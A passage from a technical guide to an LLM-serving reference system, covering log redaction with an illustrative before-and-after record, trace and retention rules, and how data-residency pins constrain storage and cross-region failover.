4. **Encode.** The library escapes control characters and newlines, so text cannot forge a second record. OWASP calls this defense against log injection [SRC-704].

The HMAC key rotates every 90 days (hypothetical). So nobody can join records from different periods on the pseudonym without the old keys.

**A redaction example.** The record below is illustrative, with test values only. A rejected tool call wrote a careless error message, and the developer also put the user's text into the record:

```json
{
 "ts": "2026-10-09T09:41:07.412Z",
 "level": "WARN",
 "service": "orchestrator",
 "trace_id": "4bf92f3577b34da6a3ce929d0e0e4736",
 "request_id": "req_7Hq2Lm9Xv4Bn",
 "tenant_id": "tenant_acme",
 "user_id": "u_93",
 "client_ip": "203.0.113.37",
 "event": "tool_call_rejected",
 "user_text": "Here is our Q3 report and a photo of last week's whiteboard plan. Using our pricing policy, check the current list prices of our three main competitors, compute our gross margin at each of their price points, and plot it. Cite your sources.",
 "error": "send_email not allowed; model asked to mail the table to amina.otieno@example.com (+254 700 000 001); upstream header Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ1XzkzIn0.c2lnbmF0dXJlLWV4YW1wbGU; card 4111 1111 1111 1111; order 4111 1111 1111 1112; key sk_live_51HcQpZx7Lm2Vt9RbW4",
 "duration_ms": 412
}
```

After the four steps:

```json
{
 "ts": "2026-10-09T09:41:07.412Z",
 "level": "WARN",
 "service": "orchestrator",
 "trace_id": "4bf92f3577b34da6a3ce929d0e0e4736",
 "request_id": "req_7Hq2Lm9Xv4Bn",
 "tenant_id": "tenant_acme",
 "event": "tool_call_rejected",
 "duration_ms": 412,
 "user": "p_39aec10bd8a40ef6",
 "client_net": "203.0.113.0/24",
 "user_text_chars": 240,
 "error": "send_email not allowed; model asked to mail the table to [REDACTED:email] ([REDACTED:phone]); upstream header Authorization: [REDACTED:bearer_token]; card [REDACTED:card_number]; order 4111 1111 1111 1112; key [REDACTED:secret_key]"
}
```

What changed, by step:

- Step 1 dropped user_id, client_ip, user_text as raw fields. Step 2 kept only their transformed forms: `user`, `client_net` and `user_text_chars`.
- Step 3 made 5 replacements in `error`. It replaced the email address, the phone number, the bearer token, the card number and the secret key.
- The order number `4111 1111 1111 1112` has the shape of a card number. It fails the Luhn check, so step 3 keeps it.
- The record shrank from 847 B to 569 B.

Patterns miss things. A name, an address in prose, or a secret in an unknown format passes step 3. So step 1 is the main control: text never enters a field unless the schema declares one. Step 3 is the backup, in the same way that detection is the weakest layer in part 7.5.

### Sampling

DEBUG records hold more detail, so the system keeps only a sample of them. In this reference system, 0.1% of requests keep DEBUG records (hypothetical, RA-77). That is `3,000,000,000 × 0.001 = 3,000,000` requests per day. The edge decides once, from the trace ID, so every service keeps or drops the same requests. Sampled DEBUG records pass through the same redaction, because sampling lowers volume, not sensitivity.

### Traces without prompt text

In this reference system, the edge creates a W3C `traceparent`, and every stage adds OpenTelemetry spans (RA-52). A span holds a name, timings, a status and attributes: token counts, model, region, cache hits. No attribute holds message text.

OpenTelemetry's GenAI conventions take the same position. They mark `gen_ai.input.messages`, `gen_ai.output.messages` and `gen_ai.system_instructions` as opt-in [SRC-705]. They state that instrumentations "SHOULD NOT capture them by default" [SRC-705]. These conventions still have the status Development [SRC-705].

Baggage needs a separate rule. Baggage is a list of key-value pairs that travels with a trace on every outgoing call. The W3C text warns that baggage must hold no confidential data, or must not cross trust boundaries [SRC-198]. In this reference system, the egress service and the tool executors drop baggage before any call leaves (RA-52). Otherwise a user ID in baggage would reach the search provider and every fetched web server.

### Access control and retention

Each log class has its own retention, then deletion (hypothetical, RA-77):

| Log class | Retention (days) | Who may read it |
|---|---|---|
| application logs | 30 | on-call engineers of the owning service, scoped by service |
| DEBUG samples | 7 | the same, with a recorded reason |
| traces | 14 | engineers of any service on the path |
| security logs | 90 | the security team |
| audit events | 400 | the security team; each tenant reads its own audit trail |

Retention sets the stored volume. Application logs alone hold `1.680e+13 × 30` B ≈ 504 TB. The same retention with text would hold at least 1.22 PB.

Four access rules follow OWASP's guidance [SRC-704]:

1. Only the roles above may read, and a scheduled review checks those rights.
2. Every read of log data is itself recorded and monitored.
3. Access to another tenant's records needs a recorded approval with a time limit.
4. The store detects changed or deleted records (tamper detection).

OWASP also says that logs must not outlive their retention period [SRC-704]. So a scheduled task deletes each log class on time.

**Meanwhile in the fleet.** About 0.7 TB of structured records leave the services every hour, on average. Collectors scrub them, compress them and write them to regional log stores. Every evening a deletion task drops the partitions that passed their retention.

You can now list what your request leaves in the logs, and show how redaction cleans one record.

---

## 18.5 Data residency

Residency limits where data may live and run, so it removes regions from every routing, fallback and failover choice.

### Your home region

Your conversation's home region is `ap_south`, the nearest region to Nairobi by distance. The conversation store keeps your rows there with synchronous replication across its zones (RA-17). Your tenant has no residency contract in this example (none, hypothetical). So its home region comes from distance, not from law.

A **residency-bound tenant** has a contract or a law that ties its content to one jurisdiction. The EU's GDPR is a public example [SRC-708]. Its Article 44 allows a transfer of personal data to a third country only under its Chapter V [SRC-708]. In this reference system, each region lies in one jurisdiction (hypothetical, `residency_ref`, RA-78):

| Region | City | Jurisdiction |
|---|---|---|
| `us_east` | Ashburn, Virginia | US |
| `eu_west` | Dublin | EU |
| `ap_south` | Mumbai | IN |
| `ap_northeast` | Tokyo | JP |

The example adds a second, residency-bound tenant with the pin `IN` (hypothetical, RA-78). Only `ap_south` may hold or process its content.

### What must stay in region, and what may cross

For a residency-bound tenant, everything derived from tenant content stays in the jurisdiction. The KV cache is on the list, because it is a function of the prompt.

| Data | Where it lives | Must stay in region? | Reason |
|---|---|---|---|
| conversations, messages, settings | conversation store (RA-17) | yes | tenant content |
| uploaded files | object store (RA-21) | yes | tenant content |
| parsed text, chunks, embeddings, index partitions | parser output, search engine (RA-22 to RA-24) | yes | derived from content; a common design gives an embedding the same protection as its text |
| memory records | memory store (RA-27) | yes | derived from content |
| KV cache in G1 to G4 | HBM, DRAM, NVMe, object store (RA-39) | yes | a function of the prompt |
| sandbox files | sandbox object-store prefix (RA-69) | yes | your report's data and the chart |
| derived caches | Redis-compatible store (RA-19) | yes | they hold results and page text per tenant |
| backups and KMS keys | the region's backup store and KMS (RA-76) | yes | a backup is a copy; the key decides who can read it |
| logs, traces, usage events | regional log store, event log (RA-20) | yes, as records with IDs | IDs and timings are personal data too (18.4) |
| anonymous fleet metrics | Prometheus-style metrics: counts and histograms per deployment | no | no tenant, user or content in the labels |
| billing aggregates | hourly rows per tenant, model and usage kind (part 16.4) | yes for the rows; only totals cross | the ledger names the tenant |

OpenAI's public documentation shows the same split in a real service. Its data residency stores content at rest in the selected region [SRC-374]. The same page says that residency "does not apply to system data" [SRC-374]. For some regions, inference itself may run outside the region [SRC-374].

### The five constraints

Residency constrains five decisions:

1. **Region routing.** The global traffic manager uses data residency as one of its signals (RA-06). For a residency-bound tenant, it removes every region outside the jurisdiction before it weighs health and latency.
2. **Storage.** The home region of every row and object is the tenant's jurisdiction region. The row-level home region of part 16.1 makes this a per-tenant setting.
3. **Backups.** Backups and their keys stay in the jurisdiction. A second copy for disaster recovery needs a second location inside the jurisdiction, not the nearest region.
4. **Tool execution.** The sandbox and the egress service run in the tenant's region. Web search sends query text to the search provider (RA-28). For a residency-bound tenant, the provider needs an endpoint in the jurisdiction. Otherwise the tenant disables web access, and `web_search` leaves the tool list (RA-66).
5. **Cross-region fallback and failover.** The jurisdiction forbids every region outside it, as a fallback target (RA-57) and as a failover target (RA-06). So the tenant needs a second region inside the jurisdiction, or its requests fail closed (RA-78).

### Cross-region fallback for a residency-bound tenant

In this reference system, an unavailable deployment falls back to the same model in the next-nearest healthy region (RA-57). The fallback list is the region ranking by distance from the user: ap_south, eu_west, ap_northeast, us_east (part 2.8). For a residency-bound tenant, the residency filter runs first (hypothetical, `residency_ref`, RA-78):

```mermaid
flowchart TD
  F[ap_south deployment unavailable]:::cpu -->|asks| P{residency-bound tenant?}:::cpu
  P -->|no| N[take next region by distance: eu_west]:::edge
  P -->|yes| A[keep only regions in the jurisdiction]:::cpu
  A -->|finds none| C[fail closed: 503 with Retry-After]:::other
  A -->|finds one| N2[route to that region]:::edge
  N -->|reads and writes home data| H[(home store in ap_south)]:::store
  classDef cpu fill:#ede9fe,stroke:#A78BFA,color:#111
  classDef edge fill:#e0f2fe,stroke:#38BDF8,color:#111
  classDef store fill:#d1fae5,stroke:#34D399,color:#111
  classDef other fill:#f3f4f6,stroke:#9ca3af,color:#111
```

Legend: violet = decisions in the model router (RA-57); blue = routing results; green = the home store; grey = the rejection. The one thing to notice: the residency filter runs before distance, so it can leave an empty list. The diagram leaves out the smaller-model fallback of RA-57 on purpose; it comes only after every same-model region.

The two tenants of the example:

| | Your tenant | The residency-bound tenant |
|---|---|---|
| pin | none | IN |
| allowed regions | ap_south, eu_west, ap_northeast, us_east | ap_south |
| fallback order | eu_west, ap_northeast, us_east | none |
| result when `ap_south` is unavailable | served in `eu_west` | fail closed: 503 with Retry-After 30 s |

**Your tenant.** The request runs in `eu_west`. The network floor of TTFT rises by 26.6 ms (part 2.8). The conversation data stays homed in `ap_south`. So each synchronous call back to the home store adds one inter-region round trip of 74.5 ms (part 2.8). The GPUs of another jurisdiction then read your prompt, which your tenant's contract allows.

**The residency-bound tenant.** No region in its jurisdiction is left. The request gets `503` with `Retry-After: 30` (hypothetical). The client shows a temporary error, and the stored conversation does not change. Two designs avoid this outage:

1. A second region inside the jurisdiction, with its own GPU pools and a copy of the tenant's data.
2. Reserved spare capacity in the home region, so a deployment failure there is rare.

Both cost capacity that sits idle most of the time. That cost is the price of residency. So residency is a contract feature for some tenants, not a default for all.

**What real providers do.** This part is partly public. OpenAI announced data residency in Europe in February 2025, with requests "handled in-region" for new Projects [SRC-373]. It later added at-rest residency in more countries, and in-region GPU inference options for some enterprise plans [SRC-373].

How any provider fails over a residency-bound request is not public. Two realistic options are to fail closed and to keep a second region inside the jurisdiction. Here we use the first option for a single-region jurisdiction (RA-78).

**Meanwhile in the fleet.** Most requests come from tenants without a pin. So the global traffic manager can move them to another region in an incident (part 2.8). Requests of residency-bound tenants stay where they are. In a regional incident, the counters split. Traffic without a pin shifts to the next region, and the `503` responses of residency-bound tenants rise.

You can now list the data that must stay in region, and explain why a residency-bound tenant fails closed.

---

## What Part 18 established

At each trust boundary, a deterministic control keyed by the verified tenant ID decides what may pass.
